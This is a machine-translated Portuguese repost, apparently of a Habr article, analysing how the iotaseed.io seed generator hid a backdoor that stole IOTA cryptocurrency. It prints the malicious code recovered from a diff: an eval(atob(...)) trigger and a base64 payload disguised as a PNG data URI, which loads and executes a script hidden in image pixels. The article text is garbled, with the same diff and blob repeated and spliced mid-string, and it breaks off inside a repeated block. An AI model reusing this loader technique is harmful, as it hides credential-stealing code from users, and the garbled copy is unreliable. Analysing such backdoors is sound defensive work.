<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üó∫Ô∏è üî≤ ‚úã Como um gerador malicioso de frases de sites permitiu roubar US $ 4 milh√µes üë®üèª‚Äç‚öïÔ∏è üèµÔ∏è üë∏üèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A Ars Techica publicou recentemente um material descrevendo como o gerador de frases-semente iotaseed.io iotaseed.io, que era malicioso (e agora n√£o e...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Como um gerador malicioso de frases de sites permitiu roubar US $ 4 milh√µes</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/wirex/blog/410041/">  A Ars Techica <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">publicou</a> recentemente um material descrevendo como o gerador de frases-semente iotaseed.io iotaseed.io, que era malicioso (e agora n√£o est√° mais funcionando), permitiu que seu criador roubasse quase US $ 4 milh√µes em criptomoeda IOTA das carteiras dos usu√°rios. <br><br><img src="https://habrastorage.org/webt/_e/wd/5c/_ewd5cmfjowci8oegrngbfuyx-i.jpeg"><br><br>  De acordo com a descri√ß√£o da publica√ß√£o, o site ‚Äúarmazenou dados em cada frase gerada juntamente com informa√ß√µes sobre a carteira √† qual foi associada, permitindo que os propriet√°rios do site (ou aqueles que o invadiram) simplesmente esperem os tokens chegarem nas carteiras e depois retir√°-los para suas contas ".  Neste artigo, decidi estudar o lado t√©cnico desse golpe. <br><br><h3>  Estamos √† procura de um c√≥digo </h3><br>  A vers√£o original do site iotaseed.io foi substitu√≠da por uma mensagem informando que est√° desativado.  Felizmente, uma c√≥pia do site foi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=http://web.archive.org/web/20180103035549/">mantida</a> pela Wayback Machine. <br><br>  O site leva a um reposit√≥rio do github, avisando aos visitantes que o c√≥digo est√° aberto para revis√£o, mas recomendando que os usu√°rios gerem sementes no pr√≥prio site, pois o reposit√≥rio pode conter c√≥digo mais recente e ainda n√£o testado. <br><a name="habracut"></a><br>  Com base nessas informa√ß√µes, assumi que o c√≥digo malicioso agia apenas no site e n√£o estava no reposit√≥rio.  Essa abordagem tornaria poss√≠vel ocultar fragmentos de c√≥digo usados ‚Äã‚Äãpara roubar sementes.  O reposit√≥rio continha apenas c√≥digo limpo que n√£o levantava d√∫vidas ou suspeitas.  Isso explicaria a recomenda√ß√£o de usar apenas o site e n√£o o reposit√≥rio.  Se isso for verdade, qualquer tentativa de comparar o JavaScript no site com o JavaScript no reposit√≥rio do Github levaria a uma detec√ß√£o √≥bvia de uma backdoor no site. <br><br>  Infelizmente, o reposit√≥rio do iotaseed.io github se refere ao <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">norbertvdberg / iotaseed</a> j√° exclu√≠do (a conta tamb√©m foi exclu√≠da).  O Wayback Machine salvou apenas a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=https://web.archive.org/web/20180103035549/">p√°gina principal do</a> reposit√≥rio.  Em resposta a tentativas de examinar o c√≥digo ou fazer download de seu arquivo zip, o WM diz que essas p√°ginas n√£o foram arquivadas nele.  No entanto, olhando para o balc√£o do garfo no canto superior direito, podemos descobrir que esse c√≥digo foi bifurcado por 8 contas diferentes.  Ap√≥s verificar o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">artigo correspondente</a> na base de conhecimento do GitHub, aprendemos que excluir o reposit√≥rio n√£o afeta o trabalho de seus garfos.  Isso significa que c√≥pias deste reposit√≥rio ainda podem existir em algum lugar na vastid√£o do servi√ßo. <br><br><img src="https://habrastorage.org/webt/6h/ln/ju/6hlnju7jwjrgpev--u5fv7e6hlk.png"><br><br>  Uma pesquisa r√°pida dos commits vis√≠veis em uma c√≥pia da p√°gina salva pelo Wayback Machine permite descobrir o seguinte: <br><br><img src="https://habrastorage.org/webt/cm/se/zz/cmsezzj-hzglrbiqlosf0wb8ou4.png"><br><br>  Parece que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">eggdroid / eggseed3</a> √© um dos garfos do c√≥digo iotaseed.io original.  Todos os 26 commits nele s√£o feitos por norbertvdberg, ou seja, o mesmo propriet√°rio do reposit√≥rio original.  Agora que temos um site e arquivos JavaScript do github √† nossa disposi√ß√£o, √© hora de compar√°-los e encontrar a diferen√ßa. <br><br><h3>  Analisando o c√≥digo </h3><br>  O gerador de sementes consiste em muitos arquivos JavaScript diferentes combinados em um arquivo <font color="#e83e8c"><code>all.js</code></font> minimizado para <font color="#e83e8c"><code>all.mini.js.</code></font>  Foi ele quem de fato foi usado na p√°gina.  Portanto, comparei-o com o mesmo arquivo js da c√≥pia WM salva. <br><br><pre> <code class="javascript hljs">$ shasum all-website.mini.js all-github.mini.js <span class="hljs-number"><span class="hljs-number">3</span></span>d48933698d8cf1d1673067d782595c12c815424 all-website.mini.js <span class="hljs-number"><span class="hljs-number">3</span></span>d48933698d8cf1d1673067d782595c12c815424 all-github.mini.js</code> </pre> <br>  Infelizmente, os dois arquivos acabaram sendo os mesmos.  Revendo o c√≥digo, notei que imediatamente ap√≥s a carteira ser gerada, o Web Worker <a href="">come√ßou a</a> gerar c√≥digos e dados QR para a vers√£o em papel da carteira.  O c√≥digo para este trabalhador est√° em outro <font color="#e83e8c"><code>all-wallet.mini.js</code></font> .  Talvez algo estivesse escondido nele? <br><br>  As vers√µes desse arquivo do site e da c√≥pia do WM pareciam diferentes e, portanto, eu executei os dois arquivos atrav√©s do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">js-beautify</a> e os comparei com o diff para ver as diferen√ßas espec√≠ficas. <br><br><pre> <code class="diff hljs">$ diff all-wallet-website.js all-wallet-github.js 1313c1313 &lt; t = t || {}, this.version = e("../package.json").version, this.host = t.host ? t.host : "http://web.archive.org/web/20180120222030/http://localhost/", this.port = t.port ? t.port : 14265, this.provider = t.provider || this.host.replace(/\/$/, "") + ":" + this.port, this.sandbox = t.sandbox || !1, this.token = t.token || !1, this.sandbox &amp;&amp; (this.sandbox = this.provider.replace(/\/$/, ""), this.provider = this.sandbox + "/commands"), this._makeRequest = new o(this.provider, this.token), this.api = new a(this._makeRequest, this.sandbox), this.utils = i, this.valid = e("./utils/inputValidator"), this.multisig = new s(this._makeRequest) --- &gt; t = t || {}, this.version = e("../package.json").version, this.host = t.host ? t.host : "http://localhost", this.port = t.port ? t.port : 14265, this.provider = t.provider || this.host.replace(/\/$/, "") + ":" + this.port, this.sandbox = t.sandbox || !1, this.token = t.token || !1, this.sandbox &amp;&amp; (this.sandbox = this.provider.replace(/\/$/, ""), this.provider = this.sandbox + "/commands"), this._makeRequest = new o(this.provider, this.token), this.api = new a(this._makeRequest, this.sandbox), this.utils = i, this.valid = e("./utils/inputValidator"), this.multisig = new s(this._makeRequest) 1713c1713 &lt; this.provider = e || "http://web.archive.org/web/20180120222030/http://localhost:14265/", this.token = t --- &gt; this.provider = e || "http://localhost:14265", this.token = t 1718c1718 &lt; this.provider = e || "http://web.archive.org/web/20180120222030/http://localhost:14265/" --- &gt; this.provider = e || "http://localhost:14265" 6435c6435 &lt; website: "http://web.archive.org/web/20180120222030/https://iota.org/" --- &gt; website: "https://iota.org" 6440c6440 &lt; url: "http://web.archive.org/web/20180120222030/https://github.com/iotaledger/iota.lib.js/issues" --- &gt; url: "https://github.com/iotaledger/iota.lib.js/issues" 6444c6444 &lt; url: "http://web.archive.org/web/20180120222030/https://github.com/iotaledger/iota.lib.js.git" --- &gt; url: "https://github.com/iotaledger/iota.lib.js.git"</code> </pre> <br>  Mas a √∫nica diferen√ßa foi que a Wayback Machine reescreveu alguns URLs para apontar para <font color="#e83e8c"><code>web.archive.org</code></font> .  Do ponto de vista funcional, o c√≥digo de gera√ß√£o de sementes nos dois arquivos acabou sendo o mesmo. <br><br>  Depois disso, decidi dar uma olhada mais de perto no index.html e notei o carregamento de outro javascript da <a href="">biblioteca de alertas</a> , que eu ignorei primeiro.  Fiz as mesmas manipula√ß√µes com sua c√≥pia WM salva e a c√≥pia do reposit√≥rio e o c√≥digo suspeito se tornou √≥bvio: <br><br><pre> <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> dados: imagem / jpeg; base64, iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A / wD / oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo / h4eEzODbm5 + eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03 / 9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q, ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4 + MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7, TbRznoTD3oTD1JR0iX <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> zMnj4 + PW19VGRkbqPi7v7 / D6 + vr09fXyTj4rKSvhSTo / PJ / oSDnlMyLsNCI0MTP0 /// tTT7ZRjizOi + 6PDDmLRyenZ7oKRfExMT / TzvobGEVFBWGhYUAGjLW8 / ToXVADLUZ8e33 / 2tfRRTdWVFTFQDT1u7aSkZIADib + 5eFwcHHW + / + z70tDwkIesPTPW6 teXV2xsbG7u7vY4 + Lre3DMzM2qp6jilIxsPT7lg3kdO07m / f4AJjuwsJzftK / fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f + 8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF / + o64s <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> v1fpVECdtPSy5822Bi + JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4 + 4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4 / BDMEQ6RM + oNQ6vjJyWFTNTDJlau0e1drAO + Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN + T + Uogmu2QR5ucsaXuV6w1hat <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; 